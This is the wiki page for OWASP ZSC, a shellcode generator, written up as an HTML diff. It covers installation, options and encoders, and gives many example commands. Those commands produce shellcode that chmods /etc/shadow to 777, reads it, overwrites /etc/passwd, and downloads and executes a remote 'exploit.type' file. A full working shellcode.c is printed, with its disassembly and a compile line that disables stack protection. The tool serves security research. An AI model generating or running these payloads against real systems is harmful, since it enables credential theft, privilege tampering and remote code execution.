@@ -1,0 +1,629 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Wiki - OWASP ZSC | OWASP ZCR Shellcoder</title>
+  <meta name="author" content="Ali Razmjoo">
+
+  
+  <meta name="description" content="Wiki Installation Go to download page, and download last version in github. Extract and run installer.py, then you are able to run software with &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://zsc.z3r0d4y.com/wiki/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="OWASP ZSC | OWASP ZCR Shellcoder" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-58921349-3']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">OWASP ZSC | OWASP ZCR Shellcoder</a></h1>
+  
+    <h2>Welcome To OWASP ZeroDay Cyber Research Shellcoder Home</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="zsc.z3r0d4y.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/wiki">Wiki</a></li>
+  <li><a href="/developers">Developers</a></li>
+  <li><a href="/download">Download</a></li>
+  <li><a href="/blog/archives">Tricks</a></li>
+  <li><a href="/api">API</a></li>
+  <li><a href="https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project">OWASP Page</a></li>
+  <li><a href="mailto:Ali[dot]Razmjoo[at]Owasp[dot]Org">Contact</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article role="article">
+  
+  <header>
+    <h1 class="entry-title">Wiki</h1>
+    
+  </header>
+  
+  <h2>Installation</h2>
+
+
+<p>Go to download page, and download last version in github. Extract and run installer.py, then you are able to run software with <strong>OWASP ZSC</strong> command or you can directly execute <strong>zsc.py</strong> without installing it.or you can follow these commands to install the last version:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget https://github.com/Ali-Razmjoo/OWASP-ZSC/archive/master.zip -O owasp-zsc.zip <span class="o">&amp;&amp;</span> unzip owasp-zsc.zip <span class="o">&amp;&amp;</span> rm -rf owasp-zsc.zip <span class="o">&amp;&amp;</span> mv OWASP-ZSC-master owasp-zsc <span class="o">&amp;&amp;</span> <span class="nb">cd </span>owasp-zsc <span class="o">&amp;&amp;</span> python installer.py
+</span></code></pre></td></tr></table></div></figure>
+
+
+<center><img src="http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_114843.png"></center>
+
+
+<p><br><strong>Note</strong>: Software could be <strong>uninstall</strong> with executing <strong>uninstaller.py</strong>
+<br><strong>Note</strong>: Software installation directory is &ldquo;<strong>/usr/share/owasp-zsc</strong>&rdquo;
+<br></p>
+
+<h2>How to generate shellcode with OWASP ZSC?</h2>
+
+
+<p>At first look the help menu.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Switches:
+</span><span class='line'>-h, --h, -help, --help <span class="o">=</span>&gt; to see this <span class="nb">help </span>guide
+</span><span class='line'>-os <span class="o">=</span>&gt; choose your os to create shellcode
+</span><span class='line'>-oslist   <span class="o">=</span>&gt; list os <span class="k">for</span> switch -os
+</span><span class='line'>-o <span class="o">=</span>&gt; output filename
+</span><span class='line'>-job <span class="o">=</span>&gt; what shellcode gonna <span class="k">do</span> <span class="k">for</span> you ?
+</span><span class='line'>-joblist <span class="o">=</span>&gt; list of -job switch
+</span><span class='line'>-encode <span class="o">=</span>&gt; generate shellcode with encode
+</span><span class='line'>-types <span class="o">=</span>&gt; types of encode <span class="k">for</span> -encode switch
+</span><span class='line'>-wizard <span class="o">=</span>&gt; wizard mod
+</span><span class='line'>
+</span><span class='line'>-update <span class="o">=</span>&gt; check <span class="k">for</span> update
+</span><span class='line'>-about <span class="o">=</span>&gt; about software and developers.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><br>With these switch you can see the oslist,encode types and functions [joblist] to generate your shellcode.<br>
+<br>OS List &ldquo;<strong>-oslist</strong>&rdquo;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> linux_x86
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> linux_x64
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> linux_arm
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> linux_mips
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> freebsd_x86
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> freebsd_x64
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> windows_x86
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> windows_x64
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> osx
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> solaris_x86
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> solaris_x64
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Encode Types &ldquo;<strong>-types</strong>&rdquo;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> none
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> xor_random
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> xor_yourvalue
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> add_random
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> add_yourvalue
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> sub_random
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> sub_yourvalue
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> inc
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> inc_timesyouwant
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> dec
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> dec_timesyouwant
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> mix_all
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Functions &ldquo;<strong>-joblist</strong>&rdquo;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">exec</span><span class="o">(</span><span class="s1">&#39;/path/file&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> chmod<span class="o">(</span><span class="s1">&#39;/path/file&#39;</span>,<span class="s1">&#39;permission number&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> write<span class="o">(</span><span class="s1">&#39;/path/file&#39;</span>,<span class="s1">&#39;text to write&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> file_create<span class="o">(</span><span class="s1">&#39;/path/file&#39;</span>,<span class="s1">&#39;text to write&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> dir_create<span class="o">(</span><span class="s1">&#39;/path/folder&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> download<span class="o">(</span><span class="s1">&#39;url&#39;</span>,<span class="s1">&#39;filename&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> download_execute<span class="o">(</span><span class="s1">&#39;url&#39;</span>,<span class="s1">&#39;filename&#39;</span>,<span class="s1">&#39;command to execute&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system<span class="o">(</span><span class="s1">&#39;command to execute&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> script_executor<span class="o">(</span><span class="s1">&#39;name of script&#39;</span>,<span class="s1">&#39;path and name of your script in your pc&#39;</span>,<span class="s1">&#39;execute command&#39;</span><span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now you are able to choose your operation system, function, and encode to generate your shellcode, But all of these features are not activated yet, so you have to <strong>look up</strong> this table <a href="http://zsc.z3r0d4y.com/table.html">HERE</a> to see what features are activated.</p>
+
+<center><img src="http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_123106.png"></center>
+
+
+<p><br>For example, this part of table telling us all functions for linux_x86 is activated, But <strong>Encodes</strong> [xor_random, xor_yourvalue, add_random, add_yourvalue, sub_random, sub_yourvalue, inc, inc_timesyouwant, dec, dec_timesyouwant] are just activated for <strong>chmod()</strong> function.<br></p>
+
+<h4>Examples:</h4>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;zsc -os linux_x86 -encode inc -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o file
+</span><span class='line'>&gt;zsc -os linux_x86 -encode dec -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o file
+</span><span class='line'>&gt;zsc -os linux_x86 -encode inc_10 -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o file
+</span><span class='line'>&gt;zsc -os linux_x86 -encode dec_30 -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o file
+</span><span class='line'>&gt;zsc -os linux_x86 -encode xor_random -job <span class="s2">&quot;chmod(&#39;/etc/shadow&#39;,&#39;777&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode xor_random -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;444&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode xor_0x41414141 -job <span class="s2">&quot;chmod(&#39;/etc/shadow&#39;,&#39;777&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode xor_0x45872f4d -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;444&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode add_random -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;444&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode add_0x41414141 -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode sub_random -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode sub_0x41414141 -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;444&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;file_create(&#39;/root/Desktop/hello.txt&#39;,&#39;hello&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;file_create(&#39;/root/Desktop/hello2.txt&#39;,&#39;hello[space]world[space]!&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;dir_create(&#39;/root/Desktop/mydirectory&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;download(&#39;http://www.z3r0d4y.com/exploit.type&#39;,&#39;myfile.type&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;download_execute(&#39;http://www.z3r0d4y.com/exploit.type&#39;,&#39;myfile.type&#39;,&#39;./myfile.type&#39;)&quot;</span> -o file.txt
+</span><span class='line'><span class="c">#multi command</span>
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;download_execute(&#39;http://www.z3r0d4y.com/exploit.type&#39;,&#39;myfile.type&#39;,&#39;chmod[space]777[space]myfile.type;sh[space]myfile.type&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;script_executor(&#39;script.type&#39;,&#39;D:\\myfile.type&#39;,&#39;./script.type&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;script_executor(&#39;z3r0d4y.sh&#39;,&#39;/root/z3r0d4y.sh&#39;,&#39;sh[space]z3r0d4y.sh&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;script_executor(&#39;ali.py&#39;,&#39;/root/Desktop/0day.py&#39;,&#39;chmod[space]+x[space]ali.py;[space]python[space]ali.py&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;system(&#39;ls&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;system(&#39;ls[space]-la&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;system(&#39;ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;system(&#39;wget[space]file;sh[space]file&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;chmod(&#39;/etc/shadow&#39;,&#39;777&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;write(&#39;/etc/passwd&#39;,&#39;user:pass&#39;)&quot;</span> -o file.txt
+</span><span class='line'>&gt;zsc -os linux_x86 -encode none -job <span class="s2">&quot;exec(&#39;/bin/bash&#39;)&quot;</span> -o file.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><br><strong>Note</strong>: Don&rsquo;t use space &lsquo; &rsquo; in system() function, replace it with &ldquo;[space]&rdquo; , software will detect and replace &ldquo; &rdquo; for you in shellcode.
+<br><strong>Note</strong>: script_executor(),download_execute(),download(),dir_create(),file_create() are using linux command line , not the function. [wget,mkdir,echo]
+system() function added in script, you can use it to do anything and generate any command line shellcode.
+<br><strong>Note</strong>: exec() doesn&rsquo;t support any ARGV same as exec(&lsquo;/bin/bash -c ls&rsquo;) or exec(&lsquo;/bin/bash&rsquo;,&lsquo;-c&rsquo;,&lsquo;ls&rsquo;), you have to wait for next version and this feature will available  in system()
+<br><strong>Note</strong>: you also can use high value for inc and dec time, like inc_100000, your shellcode may get too big
+<br><strong>Note</strong>: each time you execute chmod()[or any other] function with random encode, you are gonna get random outputs and different shellcode.
+<br><strong>Note</strong>: your xor value could be anything. &ldquo;xor_0x41414141&rdquo; and &ldquo;xor_0x45872f4d&rdquo; are examples.</p>
+
+<h4>Executing a sample:</h4>
+
+
+<p>Execute:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>zsc -os linux_x86 -encode inc_5 -job <span class="s2">&quot;chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)&quot;</span> -o shellcode.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Result:<br></p>
+
+<center><img src="http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_131054.png"></center>
+
+
+<p><br>
+Code result: <strong>shellcode.c</strong></p>
+
+<figure class='code'><figcaption><span>shellcode.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cm">/*</span>
+</span><span class='line'><span class="cm">This shellcode generated by ZCR Shellcoder [zsc] http://zsc.z3r0d4y.com/</span>
+</span><span class='line'><span class="cm">Title: chmod(&#39;/etc/passwd&#39;,&#39;777&#39;)</span>
+</span><span class='line'><span class="cm">OS: linux_x86</span>
+</span><span class='line'><span class="cm">Encode: inc_5</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">shellcode.c:     file format elf32-i386</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">Disassembly of section .text:</span>
+</span><span class='line'><span class="cm">00000000 &lt;.text&gt;:</span>
+</span><span class='line'><span class="cm">   0:    6a 0a                   push   $0xa</span>
+</span><span class='line'><span class="cm">   2:    58                      pop    %eax</span>
+</span><span class='line'><span class="cm">   3:    40                      inc    %eax</span>
+</span><span class='line'><span class="cm">   4:    40                      inc    %eax</span>
+</span><span class='line'><span class="cm">   5:    40                      inc    %eax</span>
+</span><span class='line'><span class="cm">   6:    40                      inc    %eax</span>
+</span><span class='line'><span class="cm">   7:    40                      inc    %eax</span>
+</span><span class='line'><span class="cm">   8:    50                      push   %eax</span>
+</span><span class='line'><span class="cm">   9:    58                      pop    %eax</span>
+</span><span class='line'><span class="cm">   a:    68 8b 90 ff 01          push   $0x1ff908b</span>
+</span><span class='line'><span class="cm">   f:    5b                      pop    %ebx</span>
+</span><span class='line'><span class="cm">  10:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  11:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  12:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  13:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  14:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  15:    53                      push   %ebx</span>
+</span><span class='line'><span class="cm">  16:    59                      pop    %ecx</span>
+</span><span class='line'><span class="cm">  17:    c1 e9 10                shr    $0x10,%ecx</span>
+</span><span class='line'><span class="cm">  1a:    68 8b 73 77 64          push   $0x6477738b</span>
+</span><span class='line'><span class="cm">  1f:    5b                      pop    %ebx</span>
+</span><span class='line'><span class="cm">  20:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  21:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  22:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  23:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  24:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  25:    53                      push   %ebx</span>
+</span><span class='line'><span class="cm">  26:    5b                      pop    %ebx</span>
+</span><span class='line'><span class="cm">  27:    c1 eb 08                shr    $0x8,%ebx</span>
+</span><span class='line'><span class="cm">  2a:    53                      push   %ebx</span>
+</span><span class='line'><span class="cm">  2b:    68 2a 70 61 73          push   $0x7361702a</span>
+</span><span class='line'><span class="cm">  30:    5b                      pop    %ebx</span>
+</span><span class='line'><span class="cm">  31:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  32:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  33:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  34:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  35:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  36:    53                      push   %ebx</span>
+</span><span class='line'><span class="cm">  37:    68 2a 65 74 63          push   $0x6374652a</span>
+</span><span class='line'><span class="cm">  3c:    5b                      pop    %ebx</span>
+</span><span class='line'><span class="cm">  3d:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  3e:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  3f:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  40:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  41:    43                      inc    %ebx</span>
+</span><span class='line'><span class="cm">  42:    53                      push   %ebx</span>
+</span><span class='line'><span class="cm">  43:    89 e3                   mov    %esp,%ebx</span>
+</span><span class='line'><span class="cm">  45:    cd 80                   int    $0x80</span>
+</span><span class='line'><span class="cm">  47:    b0 01                   mov    $0x1,%al</span>
+</span><span class='line'><span class="cm">  49:    b3 01                   mov    $0x1,%bl</span>
+</span><span class='line'><span class="cm">  4b:    cd 80                   int    $0x80</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="cm">compile example: gcc -ggdb -static -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o shellcode shellcode.c</span>
+</span><span class='line'><span class="cm">*/</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x0a\x58\x40\x40\x40\x40\x40\x50\x58\x68\x8b\x90\xff\x01\x5b\x43\x43\x43\x43\x43\x53\x59\xc1\xe9\x10\x68\x8b\x73\x77\x64\x5b\x43\x43\x43\x43\x43\x53\x5b\xc1\xeb\x08\x53\x68\x2a\x70\x61\x73\x5b\x43\x43\x43\x43\x43\x53\x68\x2a\x65\x74\x63\x5b\x43\x43\x43\x43\x43\x53\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="s">&quot;Length: %d</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span><span class='line'>    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see in output code &ldquo;<strong>shellcode.c</strong>&rdquo; you are able to compile and test shellcode with this command:</p>
+
+<figure class='code'><figcaption><span>shellcode.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">ggdb</span> <span class="o">-</span><span class="k">static</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span> <span class="o">-</span><span class="n">mpreferred</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">boundary</span><span class="o">=</span><span class="mi">2</span> <span class="o">-</span><span class="n">o</span> <span class="n">shellcode</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">c</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>result:</p>
+
+<center><img src="http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_132048.png"></center>
+
+
+<p><br><h3>Wizard Switch</h3>
